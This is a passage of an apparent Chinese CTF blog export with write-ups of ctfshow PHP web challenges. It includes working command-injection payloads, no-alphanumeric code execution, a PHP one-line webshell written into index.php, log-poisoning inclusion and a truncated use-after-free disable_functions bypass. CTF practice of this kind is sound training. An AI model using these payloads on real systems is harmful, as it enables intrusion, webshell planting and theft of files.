class=\"line\">?f=php://filter/|ctfshow/resource=flag.php   #也可以用其他的过滤器</span><br></pre></td></tr></table></figure>\n<h1 id=\"web130\"><a href=\"#web130\" class=\"headerlink\" title=\"web130\"></a>web130</h1><p><img src=\"/pic/130.png\"><br><a href=\"https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">url=&#x27;#url&#x27;</span><br><span class=\"line\">data=&#123;</span><br><span class=\"line\">    &#x27;f&#x27;:&#x27;a&#x27;*1000000+&#x27;ctfshow&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r=requests.post(url=url,data=data).text</span><br><span class=\"line\">print(r)</span><br></pre></td></tr></table></figure>\n<p>或者<br>数组绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">f[]=1   #stripos应用于数组的时候会返回null，null!==false</span><br></pre></td></tr></table></figure>\n<p>或者</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">f=ctfshow</span><br></pre></td></tr></table></figure>\n<p>/s模式下，.匹配任意字符，+表示重复一次或更多次，没错是至少一次！而后面加个?表示懒惰模式，+?表示重复1次或更多次，但尽可能少重复。当然懒惰模式并不影响解题思路，总之就是ctfshow前面必须得有字符才能匹配到，所以直接f=ctfshow就可以了。</p>\n<h1 id=\"web131\"><a href=\"#web131\" class=\"headerlink\" title=\"web131\"></a>web131</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">url=&#x27;#url&#x27;</span><br><span class=\"line\">data=&#123;</span><br><span class=\"line\">    &#x27;f&#x27;:&#x27;a&#x27;*1000000+&#x27;36Dctfshow&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r=requests.post(url=url,data=data).text</span><br><span class=\"line\">print(r)</span><br></pre></td></tr></table></figure>\n<h1 id=\"web132\"><a href=\"#web132\" class=\"headerlink\" title=\"web132\"></a>web132</h1><p><img src=\"/pic/132.png\"><br>一打开网站我都惊呆了，好高级的感觉。然后访问robots.txt有/admin访问就能看到源码。<br><img src=\"/pic/132.1.png\"><br>啊~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>这一题好简单啊。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$code === mt_rand(1,0x36D) &amp;&amp; $password === $flag</span><br></pre></td></tr></table></figure>\n<p>只要让这个为false，username=admin和code=admin就行<br>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?username=admin&amp;code=admin&amp;password=1</span><br></pre></td></tr></table></figure>\n<h1 id=\"web134\"><a href=\"#web134\" class=\"headerlink\" title=\"web134\"></a>web134</h1><p><img src=\"/pic/134.png\"><br>parse_str()函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">把查询字符解析到变量</span><br></pre></td></tr></table></figure>\n<p>ectract()函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">从数组中将变量导入当前的符号表</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">php变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">四个变量的介绍：</span><br><span class=\"line\"></span><br><span class=\"line\">1.$_SERVER[&quot;QUERY_STRING&quot;]</span><br><span class=\"line\"></span><br><span class=\"line\">说明：查询(query)的字符串</span><br><span class=\"line\"></span><br><span class=\"line\">2.$_SERVER[&quot;REQUEST_URI&quot;]</span><br><span class=\"line\"></span><br><span class=\"line\">说明：访问此页面所需的URI</span><br><span class=\"line\">　　</span><br><span class=\"line\">3.$_SERVER[&quot;SCRIPT_NAME&quot;]</span><br><span class=\"line\"></span><br><span class=\"line\">说明：包含当前脚本的路径</span><br><span class=\"line\">　　</span><br><span class=\"line\">4.$_SERVER[&quot;PHP_SELF&quot;]</span><br></pre></td></tr></table></figure>\n<p>例如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.xxx.com/?p=222 (附带查询)</span><br><span class=\"line\">结果：</span><br><span class=\"line\">$_SERVER[&quot;QUERY_STRING&quot;]==&gt;“p=222”;</span><br><span class=\"line\"></span><br><span class=\"line\">$_SERVER[&quot;REQUEST_URI&quot;] ==&gt;&quot;/?p=222&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$_SERVER[&quot;SCRIPT_NAME&quot;] ==&gt;&quot;/index.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$_SERVER[&quot;PHP_SELF&quot;] ==&gt;&quot;/index.php&quot;;</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure>\n<h1 id=\"web136\"><a href=\"#web136\" class=\"headerlink\" title=\"web136\"></a>web136</h1><p><img src=\"/pic/136.png\"><br>跟着大佬学到了好多啊<br>在linux里可以用tee命令读取标准输入的数据，并将其内容输出成文件<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=ls /|tee 1 #把根目录里的内容写进1文件里</span><br><span class=\"line\">?c=tac /f149_15_h3r3|tee 2</span><br></pre></td></tr></table></figure>\n<h1 id=\"web137\"><a href=\"#web137\" class=\"headerlink\" title=\"web137\"></a>web137</h1><p><img src=\"/pic/137.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">call_user_func — 把第一个参数作为回调函数调用</span><br></pre></td></tr></table></figure>\n<p>考察调用类中的函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">php中 -&gt;与:: 调用类中的成员的区别</span><br><span class=\"line\">-&gt;用于动态语境处理某个类的某个实例</span><br><span class=\"line\">::可以调用一个静态的、不依赖于其他初始化的类方法.</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST:ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>\n<h1 id=\"web138\"><a href=\"#web138\" class=\"headerlink\" title=\"web138\"></a>web138</h1><p><img src=\"/pic/138.png\"><br>相当于把冒号禁用了，但是call_user_func还可以传数组<br>第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST:ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>\n<h1 id=\"web139\"><a href=\"#web139\" class=\"headerlink\" title=\"web139\"></a>web139</h1><p>太难了，脚本看不懂，以后有机会了再做</p>\n<h1 id=\"web140\"><a href=\"#web140\" class=\"headerlink\" title=\"web140\"></a>web140</h1><p><img src=\"/pic/140.png\"><br>可以看到只要我们让intval($code)为0就可以了<br>intval会将非数字字符转换为0，也就是说 intval(‘a’)==0 intval(‘.’)==0 intval(‘/‘)==0<br>所以方法就挺多了<br><img src=\"/pic/140.1.png\"><br>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">f1=chr&amp;f2=chr</span><br></pre></td></tr></table></figure>\n<p>我感觉随便搞一点函数放上去都可以。</p>\n<h1 id=\"web141\"><a href=\"#web141\" class=\"headerlink\" title=\"web141\"></a>web141</h1><p><img src=\"/pic/141.png\"><br>传入的v3必须是非单词字符<br><a href=\"https://blog.csdn.net/miuzzx/article/details/109143413\">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a><br>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v2=1&amp;v3=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)-</span><br></pre></td></tr></table></figure>\n<h1 id=\"web142\"><a href=\"#web142\" class=\"headerlink\" title=\"web142\"></a>web142</h1><p><img src=\"/pic/142.png\"><br>emmmmmmmmmmmm，让我太奶来都会做<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?v1=0</span><br></pre></td></tr></table></figure>\n<h1 id=\"web143\"><a href=\"#web143\" class=\"headerlink\" title=\"web143\"></a>web143</h1><p><img src=\"/pic/143.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*&amp;v2=1</span><br></pre></td></tr></table></figure>\n<h1 id=\"web144\"><a href=\"#web144\" class=\"headerlink\" title=\"web144\"></a>web144</h1><p><img src=\"/pic/144.png\"><br>对v3的长度进行了限制,所以在v2上下手<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v2=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)&amp;v3=1</span><br></pre></td></tr></table></figure>\n<h1 id=\"web145\"><a href=\"#web145\" class=\"headerlink\" title=\"web145\"></a>web145</h1><p><img src=\"/pic/145.png\"><br>可以用三目运算符</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1?phpinfo():1;&quot;); #这是可以运行的</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):</span><br></pre></td></tr></table></figure>\n<h1 id=\"web146\"><a href=\"#web146\" class=\"headerlink\" title=\"web146\"></a>web146</h1><p>过滤了：没办法用三目运算符，可以用等号和位运算符\\</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1==phpinfo()||1;&quot;);  #这也可以运行</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v2=1&amp;v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)||</span><br></pre></td></tr></table></figure>\n<h1 id=\"web147\"><a href=\"#web147\" class=\"headerlink\" title=\"web147\"></a>web147</h1><p><img src=\"/pic/147.png\"><br><a href=\"https://paper.seebug.org/755/\">具体原理看这个</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">类似于</span><br><span class=\"line\"></span><br><span class=\"line\">function f($a) &#123;</span><br><span class=\"line\">  echo $a.&quot;123&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET:?show=&#125;system(&quot;tac flag.php&quot;);/*</span><br><span class=\"line\">POST:ctf=\\create_function</span><br></pre></td></tr></table></figure>\n<h1 id=\"web148\"><a href=\"#web148\" class=\"headerlink\" title=\"web148\"></a>web148</h1><p><img src=\"/pic/148.png\"><br>没过滤异或还可以用异或<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;);</span><br></pre></td></tr></table></figure>\n<h1 id=\"web149\"><a href=\"#web149\" class=\"headerlink\" title=\"web149\"></a>web149</h1><p><img src=\"/pic/149.png\"><br>预期解是条件竞争，可是我搞了半天也不行，就直接在index.php里改了<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET: ?ctf=index.php</span><br><span class=\"line\">POST: show=&lt;?php @eval($_POST[a];)?&gt;</span><br></pre></td></tr></table></figure>\n<p>然后用蚁剑连接。</p>\n<h1 id=\"web150\"><a href=\"#web150\" class=\"headerlink\" title=\"web150\"></a>web150</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">class CTFSHOW&#123;</span><br><span class=\"line\">    private $username;</span><br><span class=\"line\">    private $password;</span><br><span class=\"line\">    private $vip;</span><br><span class=\"line\">    private $secret;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;vip = 0;</span><br><span class=\"line\">        $this-&gt;secret = $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        echo $this-&gt;secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function isVIP()&#123;</span><br><span class=\"line\">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __autoload($class)&#123;</span><br><span class=\"line\">        if(isset($class))&#123;</span><br><span class=\"line\">            $class();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#过滤字符</span><br><span class=\"line\">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class=\"line\">if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123;</span><br><span class=\"line\">    die(&quot;error&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\">if(class_exists($__CTFSHOW__))&#123;</span><br><span class=\"line\">    echo &quot;class is exists!&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;</span><br><span class=\"line\">    include($ctf);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>非预期<br>日志文件包含写一句话<br>修改user_agent内容为一句话，然后包含/var/log/nginx/access.log就可以使用我们写的一句话了。<br>首先访问index.php 修改user_agent为<?php eval($_POST['a']);?><br><img src=\"/pic/150.png\"></p>\n","categories":["ctfshow","刷题","php特性"],"tags":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门53~56","url":"/2023/01/20/ctfshow-web%E5%85%A5%E9%97%A852~56/","content":"<h1 id=\"web53\"><a href=\"#web53\" class=\"headerlink\" title=\"web53\"></a>web53</h1><p><img src=\"/pic/53.png\"><br>多过滤了一个wget，多添加了一个回显。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=ca&#x27;&#x27;t$&#123;IFS&#125;fla&#x27;&#x27;g.php</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"web54\"><a href=\"#web54\" class=\"headerlink\" title=\"web54\"></a>web54</h1><p><img src=\"/pic/54.png\"><br>这道将使用<code>&#39;&#39;</code>的方式给剔除了。去网上找其他人的wp发现好几种方法。<br>第一种：<br>可以用mv。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;abc.txt</span><br><span class=\"line\">/abc.txt</span><br></pre></td></tr></table></figure>\n<p>第二种：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">grep test *file   #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</span><br></pre></td></tr></table></figure>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=grep$&#123;IFS&#125;ctf$&#123;IFS&#125;fl???php</span><br></pre></td></tr></table></figure>\n<p>第三种：<br>可以用<code>rev</code>逆序输出<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=rev$&#123;IFS&#125;fl??????</span><br></pre></td></tr></table></figure>\n<p>第四种：<br>用<code>paste</code>直接查看<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=paste$&#123;IFS&#125;fl??????</span><br></pre></td></tr></table></figure>\n<p>第五种：<br>可以理解为当前目录运行cat命令实际上运行的也是bin/cat。<br>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/bin/?at$&#123;IFS&#125;fl??????</span><br></pre></td></tr></table></figure>\n<h1 id=\"web55\"><a href=\"#web55\" class=\"headerlink\" title=\"web55\"></a>web55</h1><p><img src=\"/pic/55.png\" alt=\"img\"><br>题是真的恶心，脑子有点痒，感觉要长脑子了。。。。<br><a href=\"https://blog.csdn.net/qq_46091464/article/details/108555433\">继无字母数字的命令执行(ctfshow web入门 55)新姿势</a><br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=/???/????64 ????.???</span><br></pre></td></tr></table></figure>\n<h1 id=\"web56\"><a href=\"#web56\" class=\"headerlink\" title=\"web56\"></a>web56</h1><p><img src=\"/pic/56.png\" alt=\"img\"><br>题是越来越难了。<br>参考P神的文章<a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\">上无字母数字webshell之提高篇</a><br>首先构造一个POST上传文件的数据包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;POST文件上传&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;form action=&quot;http://17d01aae-51d9-48fe-abfb-d9ba10037d72.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class=\"line\">    &lt;!--链接是当前打开的题目链接--&gt;</span><br><span class=\"line\">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class=\"line\">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>上传一个php文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#!/bin/sh</span><br><span class=\"line\">ls</span><br></pre></td></tr></table></figure>\n<p>注：shell程序必须以”#!/bin/sh”开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径<br>用bp抓包<br>抓包之后添加参数c如下，多发包几次（因为并不一定生成的临时文件的最后一个字母就是大写字母），可以看到执行了ls命令<br><img src=\"/pic/56.1\" alt=\"img\"><br>参数内容为什么是 .%20/???/????????[@-[] ,P神的文章已经写的很详细了。<br>最后用cat看一下就可以了<br><img src=\"/pic/56.2\"></p>\n","categories":["web","ctfshow","刷题"],"tags":["ctfshow","刷题","web"]},{"title":"ctfshow web入门57~68","url":"/2023/01/22/ctfshow-web%E5%85%A5%E9%97%A857/","content":"<h1 id=\"web57\"><a href=\"#web57\" class=\"headerlink\" title=\"web57\"></a>web57</h1><p><img src=\"/pic/57.png\"><br>题目显示flag在36.php中，而且给出cat和php了，只要想办法构造出36就可以了。<br><code>$(())</code>是做运算，<code>$(($&#123;_&#125;))=0</code>,所以只要拼接除-36之后取反就行<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"web58\"><a href=\"#web58\" class=\"headerlink\" title=\"web58\"></a>web58</h1><p><img src=\"/pic/web58.png\"><br>题很短，但是我不会。。。<br>参考文章<a href=\"https://blog.csdn.net/miuzzx/article/details/108619930\"></a><br>payload太多了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>\n<h1 id=\"web59\"><a href=\"#web59\" class=\"headerlink\" title=\"web59\"></a>web59</h1><p>和web58差不多。<br>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>\n<h1 id=\"web60\"><a href=\"#web60\" class=\"headerlink\" title=\"web60\"></a>web60</h1><p>和前两道题一样。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>\n<h1 id=\"web-61-65\"><a href=\"#web-61-65\" class=\"headerlink\" title=\"web 61~65\"></a>web 61~65</h1><p>这些题都一样。<br>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>\n<h1 id=\"web66\"><a href=\"#web66\" class=\"headerlink\" title=\"web66\"></a>web66</h1><p><img src=\"/pic/66.png\"><br>这一道题<code>show_source</code>不能用了。<br><img src=\"/pic/66.1.png\"><br>而且flag还不在flag.php中。<br><img src=\"/pic/66.2.png\"><br>先用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">var_dump(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>\n<p>查看目录结构，发现是flag.txt<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=highlight_flie(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></figure>\n<h1 id=\"web67\"><a href=\"#web67\" class=\"headerlink\" title=\"web67\"></a>web67</h1><p>这一题和上一题一样。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=highlight_file(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></figure>\n<h1 id=\"web68\"><a href=\"#web68\" class=\"headerlink\" title=\"web68\"></a>web68</h1><p><img src=\"/pic/68.png\"><br>这一道题我都懵了，怎么不给源码啊。<br>看别人的wp说的换成文件包含就可以。。。。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=include(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></figure>","categories":["web","ctfshow","刷题"],"tags":["ctfshow","刷题","web"]},{"title":"ctfshow web入门69~74","url":"/2023/01/25/ctfshow-web%E5%85%A5%E9%97%A869~74/","content":"<h1 id=\"web69\"><a href=\"#web69\" class=\"headerlink\" title=\"web69\"></a>web69</h1><p>和web68一样。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=include(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"web70\"><a href=\"#web70\" class=\"headerlink\" title=\"web70\"></a>web70</h1><p>同上。</p>\n<h1 id=\"web71\"><a href=\"#web71\" class=\"headerlink\" title=\"web71\"></a>web71</h1><p><img src=\"/pic/71.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$s = ob_get_contents();//得到缓冲区的数据。</span><br><span class=\"line\">ob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。可以用exit();停止后面的程序。</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=include(&quot;/flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure>\n<h1 id=\"web72\"><a href=\"#web72\" class=\"headerlink\" title=\"web72\"></a>web72</h1><p><img src=\"/pic/72.png\"><br>这道题过滤了数字和字母，不会一点不会。<br>参考一下大佬的wp<br><a href=\"https://rolemee.com/2021/07/16/ctfshow-web-ru-men-ming-ling-zhi-xing-72-rao-guo-disable-function-xian-zhi-he-open-basedir-xian-zhi/\"></a><br>将</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=?&gt;&lt;?php</span><br><span class=\"line\">$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class=\"line\">foreach($a as $f)</span><br><span class=\"line\">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">exit(0);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>进行<code>url编码</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=?%3E%3C?php%0A$a=new%20DirectoryIterator(%22glob:///*%22);%0Aforeach($a%20as%20$f)%0A%7Becho($f-%3E__toString().&#x27;%20&#x27;);%0A%7D%0Aexit(0);%0A?%3E</span><br></pre></td></tr></table></figure>\n<p><img src=\"/pic/72.png\"><br>看到了<code>flag0.txt</code>,但是直接include的话没有权限。<br>要用什么uaf绕过<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i